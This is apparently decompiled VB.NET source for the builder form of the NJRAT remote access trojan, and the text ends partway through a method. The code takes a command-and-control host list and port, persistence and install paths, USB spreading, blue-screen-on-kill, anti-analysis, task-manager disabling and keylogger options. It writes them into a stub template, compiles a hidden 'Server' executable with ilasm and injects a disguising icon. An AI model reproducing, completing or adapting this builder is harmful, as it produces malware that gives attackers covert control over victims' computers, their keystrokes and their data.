Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200000C RID: 12
	<DesignerGenerated()>
	Public Partial Class Builder
		Inherits Form

		' Token: 0x060000A2 RID: 162 RVA: 0x0014B940 File Offset: 0x00149D40
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Builder.__ENCList
			SyncLock _ENCList
				Dim flag As Boolean = Builder.__ENCList.Count = Builder.__ENCList.Capacity
				If flag Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Builder.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Builder.__ENCList(num4)
						flag = weakReference.IsAlive
						If flag Then
							Dim flag2 As Boolean = num4 <> num
							If flag2 Then
								Builder.__ENCList(num) = Builder.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Builder.__ENCList.RemoveRange(num, Builder.__ENCList.Count - num)
					Builder.__ENCList.Capacity = Builder.__ENCList.Count
				End If
				Builder.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x1700003D RID: 61
		' (get) Token: 0x060000A5 RID: 165 RVA: 0x0014D778 File Offset: 0x0014BB78
		' (set) Token: 0x060000A6 RID: 166 RVA: 0x0014D790 File Offset: 0x0014BB90
		Friend Overridable Property usbx As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._usbx
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._usbx = value
			End Set
		End Property

		' Token: 0x1700003E RID: 62
		' (get) Token: 0x060000A7 RID: 167 RVA: 0x0014D79C File Offset: 0x0014BB9C
		' (set) Token: 0x060000A8 RID: 168 RVA: 0x0014D7B4 File Offset: 0x0014BBB4
		Friend Overridable Property anti3 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._anti3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._anti3 = value
			End Set
		End Property

		' Token: 0x1700003F RID: 63
		' (get) Token: 0x060000A9 RID: 169 RVA: 0x0014D7C0 File Offset: 0x0014BBC0
		' (set) Token: 0x060000AA RID: 170 RVA: 0x0014D7D8 File Offset: 0x0014BBD8
		Friend Overridable Property RZ As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._RZ
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._RZ = value
			End Set
		End Property

		' Token: 0x17000040 RID: 64
		' (get) Token: 0x060000AB RID: 171 RVA: 0x0014D7E4 File Offset: 0x0014BBE4
		' (set) Token: 0x060000AC RID: 172 RVA: 0x0014D7FC File Offset: 0x0014BBFC
		Friend Overridable Property anti2 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._anti2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.anti2_CheckedChanged
				Dim flag As Boolean = Me._anti2 IsNot Nothing
				If flag Then
					RemoveHandler Me._anti2.CheckedChanged, value2
				End If
				Me._anti2 = value
				flag = (Me._anti2 IsNot Nothing)
				If flag Then
					AddHandler Me._anti2.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000041 RID: 65
		' (get) Token: 0x060000AD RID: 173 RVA: 0x0014D85C File Offset: 0x0014BC5C
		' (set) Token: 0x060000AE RID: 174 RVA: 0x0014D874 File Offset: 0x0014BC74
		Friend Overridable Property HD As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._HD
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._HD = value
			End Set
		End Property

		' Token: 0x17000042 RID: 66
		' (get) Token: 0x060000AF RID: 175 RVA: 0x0014D880 File Offset: 0x0014BC80
		' (set) Token: 0x060000B0 RID: 176 RVA: 0x0014D898 File Offset: 0x0014BC98
		Friend Overridable Property Button5 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button5_Click
				Dim flag As Boolean = Me._Button5 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button5.Click, value2
				End If
				Me._Button5 = value
				flag = (Me._Button5 IsNot Nothing)
				If flag Then
					AddHandler Me._Button5.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000043 RID: 67
		' (get) Token: 0x060000B1 RID: 177 RVA: 0x0014D8F8 File Offset: 0x0014BCF8
		' (set) Token: 0x060000B2 RID: 178 RVA: 0x0014D910 File Offset: 0x0014BD10
		Friend Overridable Property Button4 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button4_Click
				Dim flag As Boolean = Me._Button4 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button4.Click, value2
				End If
				Me._Button4 = value
				flag = (Me._Button4 IsNot Nothing)
				If flag Then
					AddHandler Me._Button4.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000044 RID: 68
		' (get) Token: 0x060000B3 RID: 179 RVA: 0x0014D970 File Offset: 0x0014BD70
		' (set) Token: 0x060000B4 RID: 180 RVA: 0x0014D988 File Offset: 0x0014BD88
		Friend Overridable Property ColumnHeader1 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader1 = value
			End Set
		End Property

		' Token: 0x17000045 RID: 69
		' (get) Token: 0x060000B5 RID: 181 RVA: 0x0014D994 File Offset: 0x0014BD94
		' (set) Token: 0x060000B6 RID: 182 RVA: 0x0014D9AC File Offset: 0x0014BDAC
		Friend Overridable Property usb As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._usb
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.usb_CheckedChanged
				Dim flag As Boolean = Me._usb IsNot Nothing
				If flag Then
					RemoveHandler Me._usb.CheckedChanged, value2
				End If
				Me._usb = value
				flag = (Me._usb IsNot Nothing)
				If flag Then
					AddHandler Me._usb.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000046 RID: 70
		' (get) Token: 0x060000B7 RID: 183 RVA: 0x0014DA0C File Offset: 0x0014BE0C
		' (set) Token: 0x060000B8 RID: 184 RVA: 0x0014DA24 File Offset: 0x0014BE24
		Friend Overridable Property Label6 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label6 = value
			End Set
		End Property

		' Token: 0x17000047 RID: 71
		' (get) Token: 0x060000B9 RID: 185 RVA: 0x0014DA30 File Offset: 0x0014BE30
		' (set) Token: 0x060000BA RID: 186 RVA: 0x0014DA48 File Offset: 0x0014BE48
		Friend Overridable Property klen As NumericUpDown
			<DebuggerNonUserCode()>
			Get
				Return Me._klen
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NumericUpDown)
				Me._klen = value
			End Set
		End Property

		' Token: 0x17000048 RID: 72
		' (get) Token: 0x060000BB RID: 187 RVA: 0x0014DA54 File Offset: 0x0014BE54
		' (set) Token: 0x060000BC RID: 188 RVA: 0x0014DA6C File Offset: 0x0014BE6C
		Friend Overridable Property Isu As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._Isu
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._Isu = value
			End Set
		End Property

		' Token: 0x17000049 RID: 73
		' (get) Token: 0x060000BD RID: 189 RVA: 0x0014DA78 File Offset: 0x0014BE78
		' (set) Token: 0x060000BE RID: 190 RVA: 0x0014DA90 File Offset: 0x0014BE90
		Friend Overridable Property Isf As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._Isf
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._Isf = value
			End Set
		End Property

		' Token: 0x1700004A RID: 74
		' (get) Token: 0x060000BF RID: 191 RVA: 0x0014DA9C File Offset: 0x0014BE9C
		' (set) Token: 0x060000C0 RID: 192 RVA: 0x0014DAB4 File Offset: 0x0014BEB4
		Friend Overridable Property T1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._T1 = value
			End Set
		End Property

		' Token: 0x1700004B RID: 75
		' (get) Token: 0x060000C1 RID: 193 RVA: 0x0014DAC0 File Offset: 0x0014BEC0
		' (set) Token: 0x060000C2 RID: 194 RVA: 0x0014DAD8 File Offset: 0x0014BED8
		Friend Overridable Property bsod As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._bsod
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._bsod = value
			End Set
		End Property

		' Token: 0x1700004C RID: 76
		' (get) Token: 0x060000C3 RID: 195 RVA: 0x0014DAE4 File Offset: 0x0014BEE4
		' (set) Token: 0x060000C4 RID: 196 RVA: 0x0014DAFC File Offset: 0x0014BEFC
		Friend Overridable Property Label5 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label5 = value
			End Set
		End Property

		' Token: 0x1700004D RID: 77
		' (get) Token: 0x060000C5 RID: 197 RVA: 0x0014DB08 File Offset: 0x0014BF08
		' (set) Token: 0x060000C6 RID: 198 RVA: 0x0014DB20 File Offset: 0x0014BF20
		Friend Overridable Property PictureBox1 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox1 = value
			End Set
		End Property

		' Token: 0x1700004E RID: 78
		' (get) Token: 0x060000C7 RID: 199 RVA: 0x0014DB2C File Offset: 0x0014BF2C
		' (set) Token: 0x060000C8 RID: 200 RVA: 0x0014DB44 File Offset: 0x0014BF44
		Friend Overridable Property CheckBox1 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.CheckBox1_CheckedChanged
				Dim flag As Boolean = Me._CheckBox1 IsNot Nothing
				If flag Then
					RemoveHandler Me._CheckBox1.CheckedChanged, value2
				End If
				Me._CheckBox1 = value
				flag = (Me._CheckBox1 IsNot Nothing)
				If flag Then
					AddHandler Me._CheckBox1.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x1700004F RID: 79
		' (get) Token: 0x060000C9 RID: 201 RVA: 0x0014DBA4 File Offset: 0x0014BFA4
		' (set) Token: 0x060000CA RID: 202 RVA: 0x0014DBBC File Offset: 0x0014BFBC
		Friend Overridable Property Idr As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._Idr
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.Idr_CheckedChanged
				Dim flag As Boolean = Me._Idr IsNot Nothing
				If flag Then
					RemoveHandler Me._Idr.CheckedChanged, value2
				End If
				Me._Idr = value
				flag = (Me._Idr IsNot Nothing)
				If flag Then
					AddHandler Me._Idr.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000050 RID: 80
		' (get) Token: 0x060000CB RID: 203 RVA: 0x0014DC1C File Offset: 0x0014C01C
		' (set) Token: 0x060000CC RID: 204 RVA: 0x0014DC34 File Offset: 0x0014C034
		Friend Overridable Property dir As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._dir
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Me._dir = value
			End Set
		End Property

		' Token: 0x17000051 RID: 81
		' (get) Token: 0x060000CD RID: 205 RVA: 0x0014DC40 File Offset: 0x0014C040
		' (set) Token: 0x060000CE RID: 206 RVA: 0x0014DC58 File Offset: 0x0014C058
		Friend Overridable Property Label4 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label4 = value
			End Set
		End Property

		' Token: 0x17000052 RID: 82
		' (get) Token: 0x060000CF RID: 207 RVA: 0x0014DC64 File Offset: 0x0014C064
		' (set) Token: 0x060000D0 RID: 208 RVA: 0x0014DC7C File Offset: 0x0014C07C
		Friend Overridable Property exe As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._exe
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._exe = value
			End Set
		End Property

		' Token: 0x17000053 RID: 83
		' (get) Token: 0x060000D1 RID: 209 RVA: 0x0014DC88 File Offset: 0x0014C088
		' (set) Token: 0x060000D2 RID: 210 RVA: 0x0014DCA0 File Offset: 0x0014C0A0
		Friend Overridable Property GroupBox1 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox1 = value
			End Set
		End Property

		' Token: 0x17000054 RID: 84
		' (get) Token: 0x060000D3 RID: 211 RVA: 0x0014DCAC File Offset: 0x0014C0AC
		' (set) Token: 0x060000D4 RID: 212 RVA: 0x0014DCC4 File Offset: 0x0014C0C4
		Friend Overridable Property Label3 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label3 = value
			End Set
		End Property

		' Token: 0x17000055 RID: 85
		' (get) Token: 0x060000D5 RID: 213 RVA: 0x0014DCD0 File Offset: 0x0014C0D0
		' (set) Token: 0x060000D6 RID: 214 RVA: 0x0014DCE8 File Offset: 0x0014C0E8
		Friend Overridable Property VN As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._VN
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._VN = value
			End Set
		End Property

		' Token: 0x17000056 RID: 86
		' (get) Token: 0x060000D7 RID: 215 RVA: 0x0014DCF4 File Offset: 0x0014C0F4
		' (set) Token: 0x060000D8 RID: 216 RVA: 0x0014DD0C File Offset: 0x0014C10C
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim flag As Boolean = Me._Button1 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				flag = (Me._Button1 IsNot Nothing)
				If flag Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000057 RID: 87
		' (get) Token: 0x060000D9 RID: 217 RVA: 0x0014DD6C File Offset: 0x0014C16C
		' (set) Token: 0x060000DA RID: 218 RVA: 0x0014DD84 File Offset: 0x0014C184
		Friend Overridable Property port As NumericUpDown
			<DebuggerNonUserCode()>
			Get
				Return Me._port
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NumericUpDown)
				Me._port = value
			End Set
		End Property

		' Token: 0x17000058 RID: 88
		' (get) Token: 0x060000DB RID: 219 RVA: 0x0014DD90 File Offset: 0x0014C190
		' (set) Token: 0x060000DC RID: 220 RVA: 0x0014DDA8 File Offset: 0x0014C1A8
		Friend Overridable Property Label2 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label2 = value
			End Set
		End Property

		' Token: 0x17000059 RID: 89
		' (get) Token: 0x060000DD RID: 221 RVA: 0x0014DDB4 File Offset: 0x0014C1B4
		' (set) Token: 0x060000DE RID: 222 RVA: 0x0014DDCC File Offset: 0x0014C1CC
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x1700005A RID: 90
		' (get) Token: 0x060000DF RID: 223 RVA: 0x0014DDD8 File Offset: 0x0014C1D8
		' (set) Token: 0x060000E0 RID: 224 RVA: 0x0014DDF0 File Offset: 0x0014C1F0
		Friend Overridable Property host As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._host
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._host = value
			End Set
		End Property

		' Token: 0x1700005B RID: 91
		' (get) Token: 0x060000E1 RID: 225 RVA: 0x0014DDFC File Offset: 0x0014C1FC
		' (set) Token: 0x060000E2 RID: 226 RVA: 0x0014DE14 File Offset: 0x0014C214
		Friend Overridable Property Lv1 As LV
			<DebuggerNonUserCode()>
			Get
				Return Me._Lv1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As LV)
				Me._Lv1 = value
			End Set
		End Property

		' Token: 0x1700005C RID: 92
		' (get) Token: 0x060000E3 RID: 227 RVA: 0x0014DE20 File Offset: 0x0014C220
		' (set) Token: 0x060000E4 RID: 228 RVA: 0x0014DE38 File Offset: 0x0014C238
		Friend Overridable Property ColumnHeader2 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader2 = value
			End Set
		End Property

		' Token: 0x1700005D RID: 93
		' (get) Token: 0x060000E5 RID: 229 RVA: 0x0014DE44 File Offset: 0x0014C244
		' (set) Token: 0x060000E6 RID: 230 RVA: 0x0014DE5C File Offset: 0x0014C25C
		Friend Overridable Property Panel1 As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._Panel1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._Panel1 = value
			End Set
		End Property

		' Token: 0x1700005E RID: 94
		' (get) Token: 0x060000E7 RID: 231 RVA: 0x0014DE68 File Offset: 0x0014C268
		' (set) Token: 0x060000E8 RID: 232 RVA: 0x0014DE80 File Offset: 0x0014C280
		Friend Overridable Property task As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._task
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._task = value
			End Set
		End Property

		' Token: 0x060000E9 RID: 233 RVA: 0x0014DE8C File Offset: 0x0014C28C
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.Builder_Load
			Builder.__ENCAddToList(Me)
			Me.string_0 = Nothing
			Me.InitializeComponent()
		End Sub

		' Token: 0x060000EA RID: 234 RVA: 0x0014DEC0 File Offset: 0x0014C2C0
		Private Sub Builder_Load(sender As Object, e As EventArgs)
			Me.dir.SelectedIndex = 0
			Me.host.Text = Class6.smethod_2("host", Me.host.Text)
			Me.anti3.Text = Class6.smethod_2("anti3", Me.anti3.Text)
			Me.usbx.Text = Class6.smethod_2("usbx", Me.usbx.Text)
			Me.port.Value = Conversions.ToDecimal(Class6.smethod_2("p", Conversions.ToString(Me.port.Value)))
			Me.exe.Text = Class6.smethod_2("exe", Me.exe.Text)
			Me.dir.SelectedIndex = Conversions.ToInteger(Class6.smethod_2("dir", Conversions.ToString(Me.dir.SelectedIndex)))
			Me.VN.Text = Class6.smethod_2("vn", Me.VN.Text)
			Me.bsod.Checked = Conversions.ToBoolean(Class6.smethod_2("bsod", Me.bsod.Checked.ToString()))
			Me.Idr.Checked = Conversions.ToBoolean(Class6.smethod_2("Idr", Me.Idr.Checked.ToString()))
			Me.Isu.Checked = Conversions.ToBoolean(Class6.smethod_2("Isu", Me.Isu.Checked.ToString()))
			Me.Isf.Checked = Conversions.ToBoolean(Class6.smethod_2("Isf", Me.Isf.Checked.ToString()))
			Me.anti2.Checked = Conversions.ToBoolean(Class6.smethod_2("anti2", Me.anti2.Checked.ToString()))
			Me.HD.Checked = Conversions.ToBoolean(Class6.smethod_2("hd", Me.HD.Checked.ToString()))
			Me.usb.Checked = Conversions.ToBoolean(Class6.smethod_2("usb", Me.usb.Checked.ToString()))
			Me.RZ.Checked = Conversions.ToBoolean(Class6.smethod_2("rz", Me.RZ.Checked.ToString()))
			Me.task.Checked = Conversions.ToBoolean(Class6.smethod_2("task", Me.task.Checked.ToString()))
			Me.klen.Value = Conversions.ToDecimal(Class6.smethod_2("klen", Me.klen.Value.ToString()))
			Me.string_0 = Class6.smethod_2("ico", String.Empty)
			Dim flag As Boolean = Not File.Exists(Me.string_0)
			If flag Then
				Me.string_0 = String.Empty
			End If
			flag = (Convert.ToDouble(Me.port.Value) <> Conversions.ToDouble(Class6.smethod_2("port", Conversions.ToString(Me.port.Value))))
			If flag Then
				Me.port.Value = Conversions.ToDecimal(Class6.smethod_2("port", Conversions.ToString(Me.port.Value)))
			End If
			Try
				flag = (Operators.CompareString(Me.string_0, String.Empty, False) <> 0)
				If flag Then
					Me.PictureBox1.Image = New Icon(Class6.smethod_2("ico", String.Empty)).ToBitmap()
					Me.CheckBox1.Checked = True
				End If
			Catch ex As Exception
				Me.string_0 = String.Empty
			End Try
		End Sub

		' Token: 0x060000EB RID: 235 RVA: 0x0014E2CC File Offset: 0x0014C6CC
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Try
				Dim saveFileDialog As SaveFileDialog = New SaveFileDialog() With { .Filter = "EXE|*.exe", .FileName = "Server" }
				Dim flag As Boolean = saveFileDialog.ShowDialog() = DialogResult.OK
				If flag Then
					Dim flag2 As Boolean = Not Me.CheckBox1.Checked
					If flag2 Then
						Me.string_0 = Nothing
					End If
					flag2 = File.Exists(saveFileDialog.FileName)
					If flag2 Then
						File.Delete(saveFileDialog.FileName)
					End If
					Dim text As String = File.ReadAllText(Application.StartupPath + "\Stub.il")
					Dim newValue As String = Class6.smethod_4(String.Concat(New String() { Me.VN.Text, Me.host.Text, Conversions.ToString(Me.port.Value), Me.exe.Text, Me.dir.Text, Me.bsod.Checked.ToString(), Me.Idr.Checked.ToString(), Me.Isu.Checked.ToString(), Me.Isf.Checked.ToString() }))
					Dim vn As TextBox = Me.VN
					Dim text2 As String = vn.Text
					vn.Text = text2
					text = text.Replace("[VN]", Class6.smethod_14(text2)).Replace("[H]", Me.host.Text).Replace("[P]", Conversions.ToString(Me.port.Value)).Replace("[EXE]", Me.exe.Text).Replace("[DR]", Me.dir.Text.Replace("%", String.Empty)).Replace("[BD]", Me.bsod.Checked.ToString()).Replace("[RG]", newValue).Replace("[Idr]", Me.Idr.Checked.ToString()).Replace("[Isu]", Me.Isu.Checked.ToString()).Replace("[Isf]", Me.Isf.Checked.ToString()).Replace("[HD]", Me.HD.Checked.ToString()).Replace("[RZ]", Me.RZ.Checked.ToString()).Replace("[anti2]", Me.anti2.Checked.ToString()).Replace("[anti3]", Me.anti3.Text).Replace("[usb]", Me.usb.Checked.ToString()).Replace("[usbx]", Me.usbx.Text).Replace("[task]", Me.task.Checked.ToString()).Replace("[klen]", Me.klen.Value.ToString())
					File.WriteAllText(Interaction.Environ("temp") + "\stub.il", text)
					Dim startInfo As ProcessStartInfo = New ProcessStartInfo() With { .FileName = Interaction.Environ("windir") + "\Microsoft.NET\Framework\v2.0.50727\ilasm.exe", .CreateNoWindow = True, .WindowStyle = ProcessWindowStyle.Hidden, .Arguments = String.Concat(New String() { "/alignment=512 /QUIET """, Interaction.Environ("temp"), "\stub.il"" /output:""", saveFileDialog.FileName, """" }) }
					Process.Start(startInfo).WaitForExit()
					flag2 = (Me.string_0 IsNot Nothing AndAlso File.Exists(Me.string_0))
					If flag2 Then
						IconN.InjectIcon(saveFileDialog.FileName, Me.string_0)
					End If
					Dim intptr_ As IntPtr = GClass2.BeginUpdateResource(saveFileDialog.FileName, False)
					Dim array As Byte() = File.ReadAllBytes(Application.StartupPath + "\Stub.manifest")
					GClass2.UpdateResource(intptr_, CType(24, IntPtr), CType(1, IntPtr), 0S, array, array.Length)
					GClass2.EndUpdateResource(intptr_, False)
					Class6.smethod_3("host", Me.GH1().ToString())
					Class6.smethod_3("p", Conversions.ToString(Me.port.Value))
					Class6.smethod_3("exe", Me.exe.Text)
					Class6.smethod_3("dir", Conversions.ToString(Me.dir.SelectedIndex))
					Class6.smethod_3("vn", Me.VN.Text)
					Class6.smethod_3("bsod", Me.bsod.Checked.ToString())
					Class6.smethod_3("ico", Me.string_0)
					Class6.smethod_3("Idr", Me.Idr.Checked.ToString())
					Class6.smethod_3("Isu", Me.Isu.Checked.ToString())
					Class6.smethod_3("Isf", Me.Isf.Checked.ToString())
					Class6.smethod_3("klen", Me.klen.Value.ToString())
					Class6.smethod_3("hd", Me.HD.Checked.ToString())
					Class6.smethod_3("rz", Me.RZ.Checked.ToString())
					Class6.smethod_3("anti2", Me.anti2.Checked.ToString())
					Class6.smethod_3("anti3", Me.anti3.Text)
					Class6.smethod_3("usb", Me.usb.Checked.ToString())
					Class6.smethod_3("usbx", Me.usbx.Text)
					Class6.smethod_3("task", Me.task.Checked.ToString())
					Interaction.MsgBox(saveFileDialog.FileName, MsgBoxStyle.OkOnly, "DONE!")
					Me.Close()
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060000EC RID: 236 RVA: 0x0014E984 File Offset: 0x0014CD84
		Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs)
			Dim checked As Boolean = Me.CheckBox1.Checked
			If checked Then
				Dim flag As Boolean = Me.PictureBox1.Image Is Nothing
				If flag Then
					Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With { .Filter = "Icon|*.ico", .Title = "Choose Icon", .FileName = String.Empty }
					flag = (openFileDialog.ShowDialog() = DialogResult.OK)
					If flag Then
						Me.string_0 = openFileDialog.FileName
						Me.PictureBox1.Image = Image.FromFile(Me.string_0)
					End If
				End If
			Else
				Me.PictureBox1.Image = Nothing
			End If
		End Sub

		' Token: 0x060000ED RID: 237 RVA: 0x0014EA24 File Offset: 0x0014CE24
		Private Sub Idr_CheckedChanged(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.Idr.Checked
			If flag Then
				Dim flag2 As Boolean = Operators.CompareString(Me.exe.Text, String.Empty, False) = 0
				If flag2 Then
					Me.exe.Text = "server.exe"
				End If
				Me.exe.Enabled = False
				Me.dir.Enabled = False
			Else
				Me.exe.Enabled = True
				Me.dir.Enabled = True
			End If
		End Sub

		' Token: 0x060000EE RID: 238 RVA: 0x0014EAAC File Offset: 0x0014CEAC
		Public Function GH1() As String
			Dim result As String
			Try
				Dim num As Integer = Me.Lv1.Items.Count - 1
				Dim text As String
				For i As Integer = 0 To num
					text = text + Me.Lv1.Items(i).Text + ","
				Next
				result = text.Remove(text.Length - 1)
			Catch ex As Exception
				result = ""
			End Try
			Return result
		End Function

		' Token: 0x060000EF RID: 239 RVA: 0x0014EB5C File Offset: 0x0014CF5C
		Private Sub Button4_Click(sender As Object, e As EventArgs)
			Me.Lv1.Items.Add(Me.host.Text)
			Me.Button1.Enabled = True
		End Sub

		' Token: 0x060000F0 RID: 240 RVA: 0x0014EB8C File Offset: 0x0014CF8C
		Private Sub Button5_Click(sender As Object, e As EventArgs)
			Try
				Me.Lv1.Items.Clear()
				Me.Button1.Enabled = False
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060000F1 RID: 241 RVA: 0x0014EBDC File Offset: 0x0014CFDC
		Private Sub anti2_CheckedChanged(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.anti2.Checked
			If flag Then
				Me.anti3.Enabled = True
			End If
			flag = Not Me.anti2.Checked
			If flag Then
				Me.anti3.Enabled = False
			End If
		End Sub

		' Token: 0x060000F2 RID: 242 RVA: 0x0014EC28 File Offset: 0x0014D028
		Private Sub usb_CheckedChanged(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.usb.Checked
			If flag Then
				Me.usbx.Enabled = True
			End If
			flag = Not Me.usb.Checked
			If flag Then
